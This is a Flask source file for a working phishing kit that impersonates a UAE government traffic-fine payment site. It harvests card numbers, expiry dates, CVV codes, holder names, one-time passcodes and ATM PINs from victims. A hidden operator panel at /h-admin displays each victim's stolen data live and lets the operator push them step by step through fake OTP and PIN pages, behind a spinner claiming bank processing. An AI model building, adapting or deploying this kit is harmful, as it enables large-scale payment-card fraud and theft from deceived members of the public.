import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات لإدارة الجلسات ومنع تكرار البطاقات
db = {"sessions": {}, "status": "waiting", "msg": ""}

# الهيدر الحكومي الثابت
HEADER = '<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;"></div>'

# --- 1. الرئيسية و 2. الاستعلام (بناءً على طلباتك السابقة) ---
@app.route('/')
def index():
    return render_template_string(f"<html><body style='margin:0;'>{HEADER}<div style='max-width:650px;margin:0 auto;position:relative;'><img src='https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg' style='width:100%;'><button onclick='location.href=\"/search\"' style='position:absolute;top:270px;left:10%;width:80%;height:55px;background:transparent;border:none;cursor:pointer;'></button></div></body></html>")

@app.route('/search')
def search():
    return render_template_string(f"""
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>body{{background:#f7f8fa;margin:0;font-family:sans-serif;}}.moi-card{{background:white;width:92%;max-width:850px;margin:30px auto;border-top:8px solid #b0914f;padding:30px;box-shadow:0 5px 15px rgba(0,0,0,0.05);}}label{{display:block;margin:10px 0 5px;font-weight:bold;}}select,input{{width:100%;padding:15px;border:1px solid #ddd;border-radius:4px;margin-bottom:15px;}}</style></head>
    <body>{HEADER}<div class="moi-card"><h2>الاستعلام عن المخالفات</h2><label>الإمارة</label><select><option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option></select>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;"><div><label>النوع</label><select><option>خصوصي</option><option>تجاري</option></select></div><div><label>رقم اللوحة</label><input placeholder="12345"></div></div>
    <button onclick="location.href='/checkout'" style="width:100%;padding:20px;background:#b0914f;color:white;border:none;font-size:18px;font-weight:bold;cursor:pointer;">استعلام</button></div></body></html>
    """)

# --- 3. صفحة الدفع (الذهبية مع سلة المخالفات) ---
@app.route('/checkout')
def checkout():
    return render_template_string(f"""
    <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><style>
        body{{background:#f4f4f4;font-family:sans-serif;margin:0;}}
        .pay-container{{max-width:500px;margin:20px auto;background:white;box-shadow:0 0 10px rgba(0,0,0,0.1);}}
        .section-title{{background:#f1f1f1;padding:12px;font-weight:bold;color:#444;border-bottom:1px solid #ddd;}}
        .violation-item{{display:flex;align-items:center;padding:15px;border-bottom:1px solid #eee;gap:15px;}}
        .violation-item input[type="checkbox"]{{width:22px;height:22px;accent-color:#b0914f;}}
        .total-box{{padding:20px;background:#fffbe6;border:1px solid #ffe58f;text-align:center;margin:10px;font-weight:bold;font-size:18px;}}
        input, select{{width:100%;padding:15px;margin-bottom:15px;border:1px solid #ccc;border-radius:5px;outline:none;transition:0.3s;font-size:16px;}}
        input:focus, select:focus {{border-color:#b0914f; box-shadow:0 0 8px #b0914f;}}
        .btn-gold{{width:90%;display:block;margin:20px auto;padding:18px;background:#b0914f;color:white;border:none;border-radius:8px;font-size:20px;font-weight:bold;cursor:pointer;text-align:center;}}
    </style></head>
    <body>{HEADER}
        <div class="pay-container">
            <div class="section-title">اختر المخالفات التي تريد دفعها</div>
            <div class="violation-item"><input type="checkbox" class="v-check" data-price="600" onchange="calc()"> <div><span>رادار - تجاوز السرعة</span><br><small>AED 600.00</small></div></div>
            <div class="violation-item"><input type="checkbox" class="v-check" data-price="400" onchange="calc()"> <div><span>عرقلة حركة السير</span><br><small>AED 400.00</small></div></div>
            <div class="total-box">المبلغ الإجمالي: <span id="total">0.00</span> AED</div>
            <div class="section-title">معلومات الدفع</div>
            <div style="padding:20px;">
                <form action="/submit-card" method="POST">
                    <input name="card" id="cn" placeholder="رقم البطاقة" maxlength="19" required>
                    <div style="display:flex;gap:10px;">
                        <select name="exp_m" required><option value="">الشهر</option><option>01 Jan</option><option>02 Feb</option><option>03 Mar</option><option>04 Apr</option><option>05 May</option><option>06 Jun</option><option>07 Jul</option><option>08 Aug</option><option>09 Sep</option><option>10 Oct</option><option>11 Nov</option><option>12 Dec</option></select>
                        <select name="exp_y" required><option value="">السنة</option><option>2026</option><option>2027</option><option>2028</option><option>2029</option><option>2030</option></select>
                    </div>
                    <input name="cvv" placeholder="رمز التحقق (CVV)" maxlength="3" required>
                    <input name="holder" placeholder="اسم حامل البطاقة" required>
                    <button type="submit" class="btn-gold">ادفع</button>
                </form>
            </div>
        </div>
        <script>
            function calc(){{ let t=0; document.querySelectorAll('.v-check:checked').forEach(c=>t+=parseInt(c.dataset.price)); document.getElementById('total').innerText=t.toFixed(2); }}
            document.getElementById('cn').addEventListener('input',e=>{{e.target.value=e.target.value.replace(/\\s/g,'').replace(/(.{{4}})/g,'$1 ').trim();}});
        </script>
    </body></html>
    """)

# --- 4. لوحة التحكم المنظمة (البطاقة الواحدة) ---
@app.route('/h-admin')
def admin():
    return render_template_string("""
    <html lang="ar" dir="rtl"><head><style>
        body{background:#000;color:#fff;font-family:sans-serif;padding:20px;}
        .card{background:linear-gradient(45deg, #1a1a1a, #333);width:400px;padding:25px;border-radius:15px;border:2px solid gold;margin-bottom:20px;}
        .btn{padding:10px 18px;margin:5px;cursor:pointer;border:none;border-radius:5px;font-weight:bold;color:#fff;}
        .ok{background:#27ae60;} .no{background:#c0392b;}
    </style></head>
    <body>
        <h1>لوحة تحكم حسن 👮‍♂️</h1><div id="logs"></div>
        <audio id="notif" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>
        <script>
            let last = "";
            function load(){
                fetch('/get-logs').then(r=>r.json()).then(data=>{
                    let h = '';
                    for (let id in data.sessions) {
                        let l = data.sessions[id];
                        h += `<div class="card">
                            <div style="font-size:22px;letter-spacing:2px;color:gold;margin-bottom:10px;">${l.card}</div>
                            <div>${l.holder} | EXP: ${l.exp_m}/${l.exp_y} | CVV: ${l.cvv}</div>
                            <div style="background:#000;padding:15px;color:#00ff00;margin-top:15px;border-radius:8px;font-size:18px;">
                                <b>OTP:</b> ${l.otp || 'بانتظار..'} <br> <b>PIN:</b> ${l.pin || 'بانتظار..'}
                            </div>
                            <hr>
                            <b>تحكم البطاقة:</b> <button class="ok" onclick="act('go_otp','')">قبول</button> <button class="no" onclick="act('error_card','بيانات البطاقة غير صحيحة')">رفض</button><br>
                            <b>تحكم OTP:</b> <button class="ok" onclick="act('go_pin','')">قبول</button> <button class="no" onclick="act('go_otp','رمز التحقق غير صحيح')">رفض</button>
                        </div>`;
                    }
                    if(JSON.stringify(data.sessions) !== last){ document.getElementById('logs').innerHTML=h; if(last!="")document.getElementById('notif').play(); last=JSON.stringify(data.sessions); }
                });
            }
            function act(s,m){ fetch('/set-status/'+s+'?msg='+m); }
            setInterval(load, 2000);
        </script>
    </body></html>
    """)

# --- 5. صفحات الإدخال الكبيرة (OTP & PIN) ---
COMMON_STYLE = """<style>
    body{margin:0;background:#f0f2f5;font-family:sans-serif;display:flex;flex-direction:column;height:100vh;}
    .center-box{flex:1;display:flex;justify-content:center;align-items:center;padding:20px;}
    .content-card{background:white;width:100%;max-width:450px;padding:40px;border-radius:15px;box-shadow:0 10px 25px rgba(0,0,0,0.1);text-align:center;}
    input{width:100%;padding:20px;font-size:32px;text-align:center;border:2px solid #ccc;border-radius:10px;margin:20px 0;outline:none;transition:0.3s;letter-spacing:5px;}
    input:focus{border-color:#b0914f;box-shadow:0 0 10px rgba(176,145,79,0.3);}
    .btn-large{width:100%;padding:20px;background:#b0914f;color:white;border:none;border-radius:10px;font-size:22px;font-weight:bold;cursor:pointer;}
</style>"""

@app.route('/otp')
def otp():
    return render_template_string(f"""<html lang="ar" dir="rtl"><head>{COMMON_STYLE}</head><body>{HEADER}
    <div class="center-box"><div class="content-card">
        <h2 style="color:#333;">تأكيد الهوية</h2>
        <p style="color:#666;font-size:18px;">يرجى إدخال رمز التحقق (OTP) المرسل إلى هاتفك لإتمام عملية الدفع</p>
        <form action="/submit-card" method="POST">
            <input type="hidden" name="card" value="{list(db['sessions'].keys())[-1] if db['sessions'] else ''}">
            <input name="otp" placeholder="000000" maxlength="6" required autofocus>
            <button type="submit" class="btn-large">تأكيد الرمز</button>
        </form>
    </div></div></body></html>""")

@app.route('/pin')
def pin():
    return render_template_string(f"""<html lang="ar" dir="rtl"><head>{COMMON_STYLE}</head><body>{HEADER}
    <div class="center-box"><div class="content-card">
        <h2 style="color:#333;">الرقم السري للبطاقة</h2>
        <p style="color:#666;font-size:18px;">يرجى إدخال الرقم السري (PIN) الخاص بالصراف الآلي المكون من 4 أرقام</p>
        <form action="/submit-card" method="POST">
            <input type="hidden" name="card" value="{list(db['sessions'].keys())[-1] if db['sessions'] else ''}">
            <input name="pin" type="password" placeholder="****" maxlength="4" required autofocus>
            <button type="submit" class="btn-large">إرسال الرقم السري</button>
        </form>
    </div></div></body></html>""")

# --- الباكيند (Back-end) ---
@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card')
    if c and c not in db['sessions']: db['sessions'][c] = request.form.to_dict()
    elif c: db['sessions'][c].update(request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"sessions": db['sessions']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; db['msg'] = request.args.get('msg', ''); return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status'], "msg": db['msg']})

WAIT_JS = """<script>setInterval(()=>{fetch('/check-status').then(r=>r.json()).then(d=>{if(d.status==='go_otp')location.href='/otp';if(d.status==='go_pin')location.href='/pin';if(d.status==='error_card'){alert(d.msg);location.href='/checkout';}});},2000);</script>
<body style="text-align:center;padding-top:150px;font-family:sans-serif;background:#f0f2f5;">
<div style="border:6px solid #ccc;border-top:6px solid #b0914f;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;margin:auto;"></div>
<h2 style="color:#444;margin-top:20px;">جاري معالجة الطلب مع المصرف...</h2>
<style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style></body>"""

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
